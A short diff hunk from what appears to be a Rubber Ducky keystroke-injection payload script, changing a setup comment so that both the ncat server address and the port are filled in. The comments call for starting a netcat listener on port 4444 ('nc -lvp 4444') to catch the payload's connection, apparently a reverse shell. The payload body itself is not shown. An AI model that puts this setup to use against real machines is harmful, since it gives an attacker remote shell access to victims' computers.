@@ -7,7 +7,7 @@ REM *REQUIREMENTS*
 REM start a netcat listener on server machine using port 4444 (eg. nc -lvp 4444).
 
 REM *SETUP*
-REM replace YOUR_IP_OR_DOMAIN_HERE with ncat server address.
+REM replace YOUR_IP_OR_DOMAIN_HERE with ncat server address and PORT_NUMBER.
 
 REM some setup for dukie script.
 DEFAULT_DELAY 100
